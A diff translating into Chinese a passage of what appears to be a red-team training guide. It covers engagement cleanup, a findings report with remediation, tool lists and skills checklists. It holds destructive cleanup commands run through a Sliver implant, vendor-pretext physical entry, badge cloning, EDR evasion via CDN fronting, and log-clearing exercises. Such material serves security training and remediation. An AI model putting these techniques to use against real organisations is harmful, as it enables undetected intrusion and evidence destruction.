+# 客户的 CA 管理员必须通过证书颁发机构 MMC 控制台吊销它。
+# 报告中以如下形式包含序列号："Certificate Serial: [SERIAL]"
 
-# Step 3: Remove test files:
+# 步骤 3：删除测试文件：
 # SQL> EXECUTE xp_cmdshell 'rmdir /s /q C:\RedTeam_Test'
 
-# Step 4: Remove Sliver implant from LAN Turtle:
+# 步骤 4：从 LAN Turtle 上删除 Sliver 植入体：
 sliver (CSCO_NET_ASSIST) > execute rm /usr/local/bin/beacon
 sliver (CSCO_NET_ASSIST) > execute crontab -r
 
-# Step 5: Digital cleanup on LAN Turtle:
+# 步骤 5：在 LAN Turtle 上做数字清理：
 sliver (CSCO_NET_ASSIST) > execute bash /tmp/cleanup_linux.sh
 
-# Step 6: Windows cleanup on compromised workstations (via Sliver sessions):
-# Run cleanup_win.ps1 on each system we touched
+# 步骤 6：在被攻陷的工作站上做 Windows 清理（通过 Sliver 会话）：
+# 在我们碰过的每台系统上运行 cleanup_win.ps1
 
-# Step 7: krbtgt check
-# No Golden Ticket was created. krbtgt reset NOT required.
-# Document this explicitly in cleanup notes.
+# 步骤 7：krbtgt 检查
+# 未创建黄金票据。不需要重置 krbtgt。
+# 在清理笔记中明确记录这一点。
 
-# Step 8: Close Sliver beacon:
+# 步骤 8：关闭 Sliver 信标：
 sliver (CSCO_NET_ASSIST) > close
 
-# Step 9: Terminate Sliver listener:
+# 步骤 9：终止 Sliver 监听器：
 sliver > jobs --kill-all
 ```
 
 ```
-PHYSICAL RETRIEVAL (Day 8, 10:00am):
+物理取回（第 8 天，上午 10:00）：
 
-Pretext: "Following up to check if the ticket was properly closed and leave
-a spare component we mentioned in the walkthrough."
+托词：“回访确认工单是否已正确关闭，并把我们在巡检中提到的
+一个备件留下。”
 
-10:08: Operator at floor 2 networking closet
-10:08:30: Disconnect LAN Turtle from switch port 23
-10:08:45: Reconnect original unused-port condition (no cable in port 23)
-10:09:00: Exit closet. 30 seconds in closet.
-10:10: Depart building.
+10:08：操作员到达 2 层网络间
+10:08:30：从 23 号交换机端口断开 LAN Turtle
+10:08:45：恢复端口原本的空置状态（23 口不插线缆）
+10:09:00：离开网络间。在网络间内 30 秒。
+10:10：离开大楼。
 
-LAN Turtle condition on retrieval:
-  - Confirm no pending Sliver connections (close before retrieval)
-  - Wipe LAN Turtle storage: factory reset or shred /tmp and /home/root/
-  - Destroy T5577 cloned badge and visitor badge clone
+取回时 LAN Turtle 的状态：
+  - 确认没有待处理的 Sliver 连接（取回前先关闭）
+  - 擦除 LAN Turtle 存储：恢复出厂设置，或粉碎 /tmp 与 /home/root/
+  - 销毁 T5577 克隆证件与访客证件克隆
 ```
 
 ---
 
-### FINDINGS SUMMARY: OPERATION SILENT LEDGER V2
+### 发现汇总：寂静账本行动 v2
 
 ```
 +--------+-------------------------------------------+----------+------+-------+
-| ID     | Title                                     | Severity | CVSS | ATT&CK|
+| ID     | 标题                                      | 严重性   | CVSS | ATT&CK|
 +--------+-------------------------------------------+----------+------+-------+
-| F-001  | HID Prox RFID Credential Cloning          | HIGH     | 7.6  | T1606 |
-| F-002  | Social Engineering: Vendor Pretext Entry  | HIGH     | 7.8  | T1566 |
-| F-003  | LLMNR/NBT-NS Poisoning (NTLM Capture)     | HIGH     | 8.1  |T1557.1|
-| F-004  | Weak AD Account Password (IT Lead)        | HIGH     | 7.5  | T1110 |
-| F-005  | GenericWrite ACL Abuse (jchen)            | CRITICAL | 9.1  |T1484.1|
-| F-006  | Kerberoastable Service Account (mssql_svc)| HIGH     | 7.3  |T1558.3|
-| F-007  | ADCS ESC1: MeridianUserAuth Template      | CRITICAL | 10.0 |T1649  |
-| F-008  | Domain Admin Compromise (via ADCS ESC1)   | CRITICAL | 10.0 |T1078.2|
-| F-009  | NTDS.dit Full Domain Hash Extraction      | CRITICAL | 10.0 |T1003.3|
-| F-010  | Azure AD Lateral Movement via Hybrid Join | CRITICAL | 9.5  |T1550.1|
-| F-011  | Azure DevOps Repo: Crown Jewel Reached    | CRITICAL | 10.0 |T1213  |
-| F-012  | SQL Database: Client Portfolio Accessed   | CRITICAL | 9.8  |T1005  |
-| F-013  | Ransomware Simulation (Test Files Only)   | CRITICAL | 9.9  |T1486  |
-| F-014  | CrowdStrike Falcon: No Alert on ADCS      | INFO     | N/A  |T1649  |
-| F-015  | No OSDP on Exterior Access Readers        | MEDIUM   | 5.5  |T1606  |
+| F-001  | HID Prox RFID 凭证克隆                    | 高       | 7.6  | T1606 |
+| F-002  | 社会工程：厂商托词进入                    | 高       | 7.8  | T1566 |
+| F-003  | LLMNR/NBT-NS 投毒（NTLM 捕获）            | 高       | 8.1  | T1557.1|
+| F-004  | 弱 AD 账户密码（IT 主管）                 | 高       | 7.5  | T1110 |
+| F-005  | GenericWrite ACL 滥用（jchen）            | 严重     | 9.1  | T1484.1|
+| F-006  | 可 Kerberoast 的服务账户（mssql_svc）     | 高       | 7.3  | T1558.3|
+| F-007  | ADCS ESC1：MeridianUserAuth 模板          | 严重     | 10.0 | T1649 |
+| F-008  | 域管理员被攻陷（经 ADCS ESC1）            | 严重     | 10.0 | T1078.2|
+| F-009  | NTDS.dit 全域哈希提取                     | 严重     | 10.0 | T1003.3|
+| F-010  | 经混合加入的 Azure AD 横向移动            | 严重     | 9.5  | T1550.1|
+| F-011  | Azure DevOps 仓库：触达核心资产           | 严重     | 10.0 | T1213 |
+| F-012  | SQL 数据库：访问客户投资组合              | 严重     | 9.8  | T1005 |
+| F-013  | 勒索软件模拟（仅测试文件）                | 严重     | 9.9  | T1486 |
+| F-014  | CrowdStrike Falcon：ADCS 未告警           | 信息     | N/A  | T1649 |
+| F-015  | 外部入口读卡器未启用 OSDP                 | 中       | 5.5  | T1606 |
 +--------+-------------------------------------------+----------+------+-------+
 
-NOTE ON F-014:
-  CrowdStrike Falcon did not alert on the certipy certificate enrollment.
-  This is a detection gap in the EDR configuration: not a product failure.
-  Recommendation: enable CrowdStrike Identity Protection module and configure
-  the ADCS-related detection policies (available in Falcon since platform version 6.44).
+关于 F-014 的说明：
+  CrowdStrike Falcon 未对 certipy 的证书注册告警。
+  这是 EDR 配置中的检测缺口：不是产品缺陷。
+  建议：启用 CrowdStrike Identity Protection 模块，并配置
+  与 ADCS 相关的检测策略（Falcon 平台 6.44 版本起提供）。
 
-THREE IMMEDIATE ACTIONS (for the debrief):
-  1. Disable LLMNR and NBT-NS via Group Policy
-     (Computer Configuration > Administrative Templates > Network > DNS Client)
-     This removes the credential capture vector that provided the initial foothold.
+三项立即行动（用于复盘）：
+  1. 通过组策略禁用 LLMNR 与 NBT-NS
+     （计算机配置 > 管理模板 > 网络 > DNS 客户端）
+     这会移除提供初始据点的凭证捕获载体。
   
-  2. Remediate ADCS template "MeridianUserAuth"
-     (Disable "Supply in the request" / client-supplied SAN in the template properties)
-     Revoke all certificates issued from this template in the last 90 days.
-     This closes the single most critical privilege escalation path in the environment.
+  2. 修复 ADCS 模板 "MeridianUserAuth"
+     （在模板属性中禁用 "Supply in the request" / 客户端自填 SAN）
+     吊销过去 90 天内从该模板签发的所有证书。
+     这会封堵该环境中最关键的一条提权路径。
   
-  3. Implement phishing-resistant MFA on all M365 accounts
-     (FIDO2/WebAuthn hardware tokens or Passkeys)
-     This prevents the Azure AD lateral movement that followed from password-based auth.
+  3. 对所有 M365 账户实施抗钓鱼 MFA
+     （FIDO2/WebAuthn 硬件令牌或 Passkey）
+     这能阻止由基于密码的认证引发的后续 Azure AD 横向移动。
 
-DEBRIEF CHALLENGE QUESTIONS:
-  "Would a real attacker have stopped where you stopped?"
-    No. A real attacker with domain admin and Azure DevOps access would have:
-    exfiltrated the full trading algorithm source code, planted persistent backdoors
-    in the Azure AD tenant (backdoor service principal), and potentially disrupted
-    trading operations. We stopped at access confirmation. The adversary would not.
+复盘挑战性提问：
+  “真正的攻击者会在你停下的地方停下吗？”
+    不会。拥有域管理员与 Azure DevOps 访问权限的真实攻击者会：
+    外传完整的交易算法源代码、在 Azure AD 租户中植入持久后门
+    （后门服务主体），并可能扰乱交易业务。
+    我们在确认访问权限后就停止了。对手不会。
   
-  "How did you get past CrowdStrike?"
-    CrowdStrike did not detect our activity because:
-    a. The LAN Turtle beacon used HTTPS over CDN fronting (indistinguishable from
-       legitimate Cloudflare traffic in the network telemetry)
-    b. Certipy runs on the operator machine (not inside the network): no process to detect
-    c. ADCS attacks are a detection gap in the current Falcon configuration
-    d. All tools were run via proxychains through the Sliver SOCKS tunnel: no binaries
-       were dropped on Windows endpoints until we had domain admin
+  “你们是怎么绕过 CrowdStrike 的？”
+    CrowdStrike 没有检测到我们的活动，因为：
+    a. LAN Turtle 信标使用经 CDN 前置的 HTTPS（在网络遥测中与合法
+       Cloudflare 流量无法区分）
+    b. Certipy 在操作员机器上运行（不在网络内）：没有进程可检测
+    c. ADCS 攻击是当前 Falcon 配置中的检测缺口
+    d. 所有工具都通过 proxychains 经 Sliver SOCKS 隧道运行：在取得域管理员
+       之前，没有二进制文件落到 Windows 端点上
   
-  "Which single fix would have prevented the most downstream damage?"
-    Remediating the ADCS ESC1 vulnerability. If the MeridianUserAuth template had been
-    configured correctly (no client-supplied SAN + manager approval required), we would
-    have needed a different escalation path from mssql_svc to Domain Admin. Kerberoasting
-    alone (without ADCS) would have given us mssql_svc service account access to the SQL
-    database: significant, but not Domain Admin and not Azure DevOps.
-    ADCS ESC1 is the single most high-leverage finding in this report.
+  “哪一项修复能阻止最多的下游损害？”
+    修复 ADCS ESC1 漏洞。如果 MeridianUserAuth 模板配置正确
+    （无客户端自填 SAN + 要求管理员审批），我们就需要从 mssql_svc
+    到域管理员的另一条提权路径。仅靠 Kerberoasting
+    （没有 ADCS）只能让我们以 mssql_svc 服务账户访问 SQL
+    数据库：影响显著，但不是域管理员，也进不了 Azure DevOps。
+    ADCS ESC1 是本报告中杠杆效应最高的单项发现。
 ```
 
 ---
 
-## PHASE 6 RESOURCE REFERENCE
+## 第 6 阶段资源参考
 
-### Physical Red Team
-
-```
-LOCK PICKING:
-  LockPickingLawyer (YouTube): the standard video reference for technique
-  BosnianBill (YouTube): excellent on high-security locks and bypass
-  Deviant Ollam: "Practical Lock Picking" 2nd Edition (No Starch Press, 2012)
-  Sparrows Lock Picks (sparrowslockpicks.com): best beginner and mid-level pick sets
-  Multipick (multipick.com): German professional-grade picks
-  TOOOL (The Open Organisation Of Lockpickers) - toool.us: community + resources
-
-RFID AND ACCESS CONTROL:
-  Proxmark3 RDV4 (proxmark.com): the standard professional RFID research tool
-  Proxmark3 community firmware (Iceman fork): github.com/RfidResearchGroup/proxmark3
-  Flipper Zero (flipperzero.one): versatile beginner RFID + sub-GHz + IR tool
-  Covert Instruments (covertinstruments.com): bypass tools, UDT, bypass wedges
-  OSDP Protocol Specification: siaonline.org (SIA membership: register free)
-  OSDP Tool: github.com/ezforever/osdp-tool
-
-PHYSICAL RED TEAM TRAINING:
-  Deviant Ollam - DEF CON Physical Security Village talks (YouTube, free)
-  ALOA (Associated Locksmiths of America) - alocka.com: certification programs
-  Red Team Alliance Physical Pentest Course - redteamalliance.com
-  Hak5 (hak5.org): LAN Turtle, Shark Jack, and all implant hardware
-```
-
-### Social Engineering
+### 物理红队
 
 ```
-OSINT TOOLS:
-  Maltego Community Edition: maltego.com/downloads (free tier)
-  SpiderFoot: github.com/smicallef/spiderfoot (open source, self-hosted)
-  Sherlock: github.com/sherlock-project/sherlock (username OSINT)
-  OSINT Framework: osintframework.com (comprehensive resource index)
-  hunter.io: email format discovery (free tier: 25 searches/month)
+开锁：
+  LockPickingLawyer（YouTube）：技术上的标准视频参考
+  BosnianBill（YouTube）：在高安全性锁与绕过方面极为出色
+  Deviant Ollam：《Practical Lock Picking》第 2 版（No Starch Press，2012）
+  Sparrows Lock Picks（sparrowslockpicks.com）：最好的新手与中阶撬钩套装
+  Multipick（multipick.com）：德国专业级撬钩
+  TOOOL（The Open Organisation Of Lockpickers）- toool.us：社群 + 资源
 
-BOOKS:
-  "The Art of Intrusion" - Kevin Mitnick (Wiley, 2005): case studies
-  "Influence: The Psychology of Persuasion" - Robert Cialdini (Harper Business, 2021)
-  "The Art of Human Hacking" - Chris Hadnagy (Wiley, 2010): SE methodology
-  "Social Engineering: The Science of Human Hacking" - Chris Hadnagy (Wiley, 2018): updated
+RFID 与门禁：
+  Proxmark3 RDV4（proxmark.com）：标准专业 RFID 研究工具
+  Proxmark3 社区固件（Iceman 分支）：github.com/RfidResearchGroup/proxmark3
+  Flipper Zero（flipperzero.one）：通用的入门级 RFID + sub-GHz + 红外工具
+  Covert Instruments（covertinstruments.com）：绕过工具、UDT、绕过楔
+  OSDP 协议规范：siaonline.org（SIA 会员：免费注册）
+  OSDP 工具：github.com/ezforever/osdp-tool
 
-CAMPAIGNS:
-  GoPhish: getgophish.com (phishing campaign framework, open source)
-  Evilginx3: github.com/kgretzky/evilginx2 (AiTM phishing framework)
-
-TRAINING:
-  Social-Engineer.org: resources + newsletter + podcast
-  DEF CON Social Engineering CTF (SECTF): annual competition, recordings on YouTube
-  SANS SEC567: Social Engineering for Security Professionals (paid, excellent)
+物理红队培训：
+  Deviant Ollam - DEF CON 物理安全村演讲（YouTube，免费）
+  ALOA（Associated Locksmiths of America）- alocka.com：认证项目
+  Red Team Alliance 物理渗透测试课程 - redteamalliance.com
+  Hak5（hak5.org）：LAN Turtle、Shark Jack 及全部植入硬件
 ```
 
-### Quantum Computing and PQC
+### 社会工程
 
 ```
-FOUNDATIONS:
-  "An Introduction to Mathematical Cryptography" - Hoffstein, Pipher, Silverman
-  Christof Paar: "Introduction to Cryptography" lecture series (YouTube, free)
-  "Post-Quantum Cryptography" - Bernstein and Lange (Springer, free PDF online)
+OSINT 工具：
+  Maltego Community Edition：maltego.com/downloads（免费档）
+  SpiderFoot：github.com/smicallef/spiderfoot（开源，自托管）
+  Sherlock：github.com/sherlock-project/sherlock（用户名 OSINT）
+  OSINT Framework：osintframework.com（全面的资源索引）
+  hunter.io：邮箱格式发现（免费档：每月 25 次查询）
+
+书籍：
+  《The Art of Intrusion》- Kevin Mitnick（Wiley，2005）：案例研究
+  《Influence: The Psychology of Persuasion》- Robert Cialdini（Harper Business，2021）
+  《The Art of Human Hacking》- Chris Hadnagy（Wiley，2010）：社会工程方法论
+  《Social Engineering: The Science of Human Hacking》- Chris Hadnagy（Wiley，2018）：更新版
+
+行动框架：
+  GoPhish：getgophish.com（钓鱼行动框架，开源）
+  Evilginx3：github.com/kgretzky/evilginx2（AiTM 钓鱼框架）
+
+培训：
+  Social-Engineer.org：资源 + 通讯 + 播客
+  DEF CON 社会工程 CTF（SECTF）：年度竞赛，录像见 YouTube
+  SANS SEC567：Social Engineering for Security Professionals（付费，极佳）
+```
+
+### 量子计算与 PQC
+
+```
+基础：
+  《An Introduction to Mathematical Cryptography》- Hoffstein、Pipher、Silverman
+  Christof Paar：《Introduction to Cryptography》系列讲座（YouTube，免费）
+  《Post-Quantum Cryptography》- Bernstein 与 Lange（Springer，网上免费 PDF）
   
-NIST PQC STANDARDS (all free at csrc.nist.gov):
-  FIPS 203: ML-KEM (CRYSTALS-Kyber) - key encapsulation
-  FIPS 204: ML-DSA (CRYSTALS-Dilithium) - digital signatures
-  FIPS 205: SLH-DSA (SPHINCS+) - hash-based signatures
+NIST PQC 标准（全部可在 csrc.nist.gov 免费获取）：
+  FIPS 203：ML-KEM（CRYSTALS-Kyber）- 密钥封装
+  FIPS 204：ML-DSA（CRYSTALS-Dilithium）- 数字签名
+  FIPS 205：SLH-DSA（SPHINCS+）- 基于哈希的签名
 
-TOOLS:
-  Open Quantum Safe (liboqs): openquantumsafe.org - reference PQC implementations
-  RF Explorer: rfexplorer.com/rf-explorer-model-3g-plus ($130): spectrum analysis
-  Zeek Network Security Monitor: zeek.org (free, open source)
+工具：
+  Open Quantum Safe（liboqs）：openquantumsafe.org - 参考 PQC 实现
+  RF Explorer：rfexplorer.com/rf-explorer-model-3g-plus（130 美元）：频谱分析
+  Zeek 网络安全监控：zeek.org（免费，开源）
 
-PQC DEPLOYMENT TRACKING:
-  Cloudflare PQC progress: blog.cloudflare.com (search "post-quantum")
-  NIST PQC project: csrc.nist.gov/projects/post-quantum-cryptography
-  Chromium PQC notes: chromestatus.com (search "ML-KEM")
+PQC 部署进展跟踪：
+  Cloudflare PQC 进展：blog.cloudflare.com（搜索 "post-quantum"）
+  NIST PQC 项目：csrc.nist.gov/projects/post-quantum-cryptography
+  Chromium PQC 说明：chromestatus.com（搜索 "ML-KEM"）
 ```
 
-### Red Team Operations and ADCS
+### 红队行动与 ADCS
 
 ```
-RED TEAM METHODOLOGY:
-  MITRE ATT&CK Framework: attack.mitre.org (free, essential)
-  Red Team Development and Operations (Joe Vest, James Tubberville): leanpub.com
-  TIBER-EU Framework: ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf
-  CBEST Framework: bankofengland.co.uk (search "CBEST")
-  CVSSv4.0 Calculator: cvssv4calc.first.org
+红队方法论：
+  MITRE ATT&CK 框架：attack.mitre.org（免费，必读）
+  Red Team Development and Operations（Joe Vest、James Tubberville）：leanpub.com
+  TIBER-EU 框架：ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf
+  CBEST 框架：bankofengland.co.uk（搜索 "CBEST"）
+  CVSSv4.0 计算器：cvssv4calc.first.org
 
-ADCS ATTACK RESEARCH:
-  "Certified Pre-Owned" (SpecterOps, 2021): specterops.io/assets/resources/Certified_Pre-Owned.pdf
-    The foundational paper that identified ESC1-ESC8. Essential reading.
-  Certipy: github.com/ly4k/Certipy (Python tool for ADCS attacks)
-  PKIAudit: github.com/GhostManager/pkiaudit (ADCS audit PowerShell)
+ADCS 攻击研究：
+  《Certified Pre-Owned》（SpecterOps，2021）：specterops.io/assets/resources/Certified_Pre-Owned.pdf
+    识别出 ESC1-ESC8 的奠基性论文。必读。
+  Certipy：github.com/ly4k/Certipy（用于 ADCS 攻击的 Python 工具）
+  PKIAudit：github.com/GhostManager/pkiaudit（ADCS 审计 PowerShell）
   
-C2 FRAMEWORKS:
-  Sliver: github.com/BishopFox/sliver (open source, Go, excellent for red team)
-  Havoc: github.com/HavocFramework/Havoc (open source C2, advanced malleable profiles)
-  Cobalt Strike: cobaltstrike.com (commercial, $3,500/year: industry standard for TIBER/CBEST)
+C2 框架：
+  Sliver：github.com/BishopFox/sliver（开源，Go，非常适合红队）
+  Havoc：github.com/HavocFramework/Havoc（开源 C2，高级可塑配置）
+  Cobalt Strike：cobaltstrike.com（商业，3500 美元/年：TIBER/CBEST 的行业标准）
   
-AD ATTACK TOOLING:
-  BloodHound CE: github.com/SpecterOps/BloodHound (AD attack path visualization)
-  Impacket: github.com/fortra/impacket (Python AD attack framework)
-  Responder: github.com/lgandx/Responder (LLMNR/NBT-NS/WPAD poisoning)
-  CrackMapExec: github.com/byt3bl33d3r/CrackMapExec (AD lateral movement)
+AD 攻击工具：
+  BloodHound CE：github.com/SpecterOps/BloodHound（AD 攻击路径可视化）
+  Impacket：github.com/fortra/impacket（Python AD 攻击框架）
+  Responder：github.com/lgandx/Responder（LLMNR/NBT-NS/WPAD 投毒）
+  CrackMapExec：github.com/byt3bl33d3r/CrackMapExec（AD 横向移动）
   
-CLOUD RED TEAM:
-  ROADtools: github.com/dirkjanm/ROADtools (Azure AD enumeration)
-  MSOLSpray: github.com/dafthack/MSOLSpray (Azure/M365 password spraying)
-  AADInternals: github.com/Gerenios/AADInternals (PowerShell Azure AD toolkit)
-  Pacu: github.com/RhinoSecurityLabs/pacu (AWS attack framework)
-  ScoutSuite: github.com/nccgroup/ScoutSuite (multi-cloud security audit)
+云红队：
+  ROADtools：github.com/dirkjanm/ROADtools（Azure AD 枚举）
+  MSOLSpray：github.com/dafthack/MSOLSpray（Azure/M365 密码喷洒）
+  AADInternals：github.com/Gerenios/AADInternals（PowerShell Azure AD 工具包）
+  Pacu：github.com/RhinoSecurityLabs/pacu（AWS 攻击框架）
+  ScoutSuite：github.com/nccgroup/ScoutSuite（多云安全审计）
 
-TSCM:
-  RF Explorer 3G+: rfexplorer.com ($130)
-  REI ORION 2.4 HX NLJD: reiusa.net (~$3,800)
-  KJB Security Products: kjbsecurity.com (lens detectors, consumer TSCM)
-  "Eavesdropping on the Great Outdoors" (DEF CON 26 talk, YouTube): RF detection basics
-  REI TSCM training: reiusa.net/training (professional TSCM certification)
+TSCM：
+  RF Explorer 3G+：rfexplorer.com（130 美元）
+  REI ORION 2.4 HX NLJD：reiusa.net（约 3800 美元）
+  KJB Security Products：kjbsecurity.com（镜头探测器、消费级 TSCM）
+  《Eavesdropping on the Great Outdoors》（DEF CON 26 演讲，YouTube）：射频检测基础
+  REI TSCM 培训：reiusa.net/training（专业 TSCM 认证）
 ```
 
 ---
 
-## PHASE 6 COMPETENCY CHECKLIST
+## 第 6 阶段能力清单
 
-### Physical Red Team
-
-```
-LOCKPICKING (verify with practice lock progression):
-  [ ] Open Master No.3 (4-pin) via SPP in under 5 minutes
-  [ ] Open Master 140 (5-pin) via SPP in under 4 minutes
-  [ ] Open ABUS 55/40 (euro quality) via SPP in under 8 minutes
-  [ ] Open a lock with spool security pins in under 6 minutes
-  [ ] Open a wafer lock via raking in under 60 seconds
-  [ ] Open a tubular lock with a tubular lock pick in under 30 seconds
-  [ ] Successfully impression a practice lock in under 45 minutes
-
-BYPASS TOOLS:
-  [ ] Shim open a standard padlock in under 20 seconds
-  [ ] Loid a spring-bolt latch door in under 15 seconds
-  [ ] Successfully use an UDT to open an inward-opening lever door
-  [ ] Deploy and use an air wedge to create a tool-entry gap
-  [ ] Identify the door type (maglock vs electric strike) on sight
-
-ELECTRONIC ACCESS CONTROL:
-  [ ] Identify HID multiCLASS vs. standard HID Prox reader by model number
-  [ ] Identify OSDP-capable readers from manufacturer and model
-  [ ] Capture a 125kHz HID Prox credential using Flipper Zero at under 15cm range
-  [ ] Clone a captured credential to a T5577 blank and test it
-  [ ] Use Proxmark3: successfully run autopwn against a MIFARE Classic card
-  [ ] Explain the difference between Wiegand and OSDP v2 Secure Channel
-  [ ] Explain when an OSDP downgrade (no SC enforced) makes Wiegand tap viable
-
-DRONE RECON:
-  [ ] Obtain a FAA Part 107 Remote Pilot Certificate (or equivalent in your jurisdiction)
-  [ ] Successfully plan a drone recon flight using airspace check tools
-  [ ] Fly a drone recon mission producing a fully annotated ISR deliverable
-  [ ] Capture thermal imagery and correctly identify a heat signature finding
-  [ ] Deploy and retrieve a drone recon mission without detection
-
-IMPLANTS:
-  [ ] Configure Sliver HTTPS beacon with CDN domain fronting
-  [ ] Deploy a LAN Turtle with a Sliver HTTPS beacon (not AutoSSH)
-  [ ] Verify the beacon checks in through Cloudflare to your C2 server
-  [ ] Demonstrate that the beacon traffic appears as HTTPS to a CDN in Wireshark
-  [ ] Physically retrieve the LAN Turtle in under 60 seconds
-```
-
-### Social Engineering
+### 物理红队
 
 ```
-  [ ] Conduct a successful vishing call using Pretext 1 (IT Helpdesk to User)
-      in a lab setting with a skeptical colleague as the target
-  [ ] Handle all three layers of objection handling in a vishing call without
-      breaking pretext
-  [ ] Construct a spear-phishing email from scratch using OSINT data
-      (company logo, correct email format, internal terminology from job postings)
-  [ ] Set up a GoPhish campaign: sending profile, template, landing page, tracking
-  [ ] Complete a full SE campaign planning document with all four metrics defined
-  [ ] Execute a tailgate entry in a controlled physical lab exercise
-  [ ] Build and deliver a complete identity legend that survives a 20-minute
-      live role-play interrogation by a colleague
-  [ ] Use Sherlock, SpiderFoot, and hunter.io to build a target profile for
-      a company within 2 hours
+开锁（用练习锁的进阶来验证）：
+  [ ] 5 分钟内单钩打开 Master No.3（4 弹子）
+  [ ] 4 分钟内单钩打开 Master 140（5 弹子）
+  [ ] 8 分钟内单钩打开 ABUS 55/40（欧标品质）
+  [ ] 6 分钟内打开带瓶形安全弹子的锁
+  [ ] 60 秒内耙开弹片锁
+  [ ] 30 秒内用管状锁撬钩打开管状锁
+  [ ] 45 分钟内成功压印出一把练习锁的钥匙
+
+绕过工具：
+  [ ] 20 秒内用垫片打开标准挂锁
+  [ ] 15 秒内用卡片打开弹簧锁舌门
+  [ ] 成功用 UDT 打开内开执手门
+  [ ] 部署并使用气楔制造工具进入缝隙
+  [ ] 一眼识别门型（磁力锁 vs 电锁扣）
+
+电子门禁：
+  [ ] 通过型号识别 HID multiCLASS 与标准 HID Prox 读卡器
+  [ ] 通过厂商和型号识别支持 OSDP 的读卡器
+  [ ] 用 Flipper Zero 在 15cm 以内采集 125kHz HID Prox 凭证
+  [ ] 把采集到的凭证克隆到 T5577 空白卡并测试
+  [ ] 使用 Proxmark3：成功对 MIFARE Classic 卡运行 autopwn
+  [ ] 解释 Wiegand 与 OSDP v2 安全通道的区别
+  [ ] 解释何时 OSDP 降级（未强制安全通道）会让 Wiegand 搭线可行
+
+无人机侦察：
+  [ ] 取得 FAA Part 107 远程飞行员证书（或你所在辖区的等效证书）
+  [ ] 使用空域检查工具成功规划一次无人机侦察飞行
+  [ ] 执行一次无人机侦察任务，产出完整标注的 ISR 交付物
+  [ ] 采集热成像图像并正确识别出一项热特征发现
+  [ ] 在未被发现的情况下部署并撤回一次无人机侦察任务
+
+植入体：
+  [ ] 配置带 CDN 域名前置的 Sliver HTTPS 信标
+  [ ] 部署带 Sliver HTTPS 信标（不用 AutoSSH）的 LAN Turtle
+  [ ] 验证信标经 Cloudflare 回连到你的 C2 服务器
+  [ ] 在 Wireshark 中证明信标流量表现为发往 CDN 的 HTTPS
+  [ ] 在 60 秒内物理取回 LAN Turtle
 ```
 
-### Quantum Computing
+### 社会工程
 
 ```
-  [ ] Explain Shor's algorithm impact on RSA/ECDSA to a non-technical executive
-      in under 3 minutes without using the word "algorithm"
-  [ ] Explain Grover's algorithm impact on AES-128 vs. AES-256 correctly
-  [ ] Explain SNDL and why it is a current (not future) threat
-  [ ] Set up Zeek + SNDL filter on a lab network: generate a Zeek ssl.log
-  [ ] Run the crypto audit script against a lab subnet: identify vulnerable endpoints
-  [ ] Build liboqs from source: confirm ML-KEM algorithms are available
-  [ ] Run the ML-KEM timing script at 10,000 samples: interpret the p-value output
-  [ ] Configure your SSH client with sntrup761x25519-sha512 key exchange:
-      verify it negotiates correctly with an OpenSSH 9.0+ server
-  [ ] Explain the PQC downgrade attack concept to a developer:
-      what the attack does, what the prerequisite is, how to defend against it
-  [ ] Explain OSDP downgrade attack and relate it to the PQC downgrade concept
-      (same class of protocol-layer stripping attack, different context)
+  [ ] 在实验室环境中，以多疑的同事为目标，用托词 1（IT 服务台致电用户）
+      成功完成一次语音钓鱼通话
+  [ ] 在一通语音钓鱼中完整处理三个层级的异议处理，且不
+      破坏托词
+  [ ] 使用 OSINT 数据从零构造一封鱼叉邮件
+      （公司 logo、正确的邮箱格式、招聘启事中的内部术语）
+  [ ] 搭建一次 GoPhish 行动：发送配置、模板、落地页、跟踪
+  [ ] 完成一份完整的行动规划文档，四项指标全部定义
+  [ ] 在受控的物理实验练习中完成一次尾随进入
+  [ ] 构建并交付一个完整的身份故事，能经受同事 20 分钟的
+      实时角色扮演审问
+  [ ] 用 Sherlock、SpiderFoot 和 hunter.io 在 2 小时内
+      为一家公司构建目标画像
 ```
 
-### Red Team Operations
+### 量子计算
 
 ```
-  [ ] Complete a scoping questionnaire for a hypothetical client engagement
-      covering all 8 sections
-  [ ] Draft a complete ROE document from the scoping questionnaire
-  [ ] Write one complete finding report (full format) for a real or simulated
-      finding, using CVSSv4.0 with correct vector string
-  [ ] Calculate a CVSSv4.0 score using cvssv4calc.first.org and explain each
-      metric choice for your selected finding
-  [ ] Deliver a 10-minute simulated debrief to a non-technical colleague
-      covering the five debrief sections
-  [ ] Write a 2-page remediation roadmap with a 30/90/6-month structure
-  [ ] Explain the three-way reporting structure of a TIBER-EU engagement
-  [ ] Explain how a TIBER-EU engagement differs from a standard red team:
-      threat intelligence phase, regulatory submission, scope constraints
+  [ ] 在 3 分钟内、不使用“算法”一词，向非技术高管解释
+      Shor 算法对 RSA/ECDSA 的影响
+  [ ] 正确解释 Grover 算法对 AES-128 与 AES-256 的不同影响
+  [ ] 解释 SNDL 以及它为何是当前（而非未来）的威胁
+  [ ] 在实验网络上搭好 Zeek + SNDL 过滤器：生成一个 Zeek ssl.log
+  [ ] 对实验子网运行密码学审计脚本：识别出受威胁的端点
+  [ ] 从源码编译 liboqs：确认 ML-KEM 算法可用
+  [ ] 用 10,000 个样本运行 ML-KEM 时序脚本：解读 p 值输出
+  [ ] 为你的 SSH 客户端配置 sntrup761x25519-sha512 密钥交换：
+      验证它与 OpenSSH 9.0+ 服务器能正确协商
+  [ ] 向开发者解释 PQC 降级攻击的概念：
+      攻击做了什么、前提是什么、如何防御
+  [ ] 解释 OSDP 降级攻击，并把它与 PQC 降级概念联系起来
+      （同一类协议层剥离攻击，语境不同）
 ```
 
-### Cleanup and TSCM
+### 红队行动
 
 ```
-  [ ] Run the Windows cleanup script in a lab: verify no scheduled tasks,
-      registry keys, or services remain after cleanup
-  [ ] Run the Sysmon-specific cleanup and verify the Sysmon log is cleared
-  [ ] Run the Linux cleanup script in a lab: verify bash history, cron jobs,
-      systemd units, and auth.log are all addressed
-  [ ] Follow the log clearing decision tree for a blind red team scenario:
-      document what you clear and why
-  [ ] Perform an RF sweep using RF Explorer on a room containing a Pi Zero W
-      (running WiFi): identify the device in the spectrum
-  [ ] Use a NLJD (or a NLJD simulator) on a room: document and triage 3+
-      false positives down to one candidate device
-  [ ] Complete the TSCM lab exercise: build a Pi Zero audio implant, conceal it,
-      attempt detection using all 5 detection methods, document results
-  [ ] Explain all four offensive planting principles and relate each to its
-      corresponding detection gap
+  [ ] 为一次假设的客户行动完成一份范围界定问卷，
+      覆盖全部 8 个部分
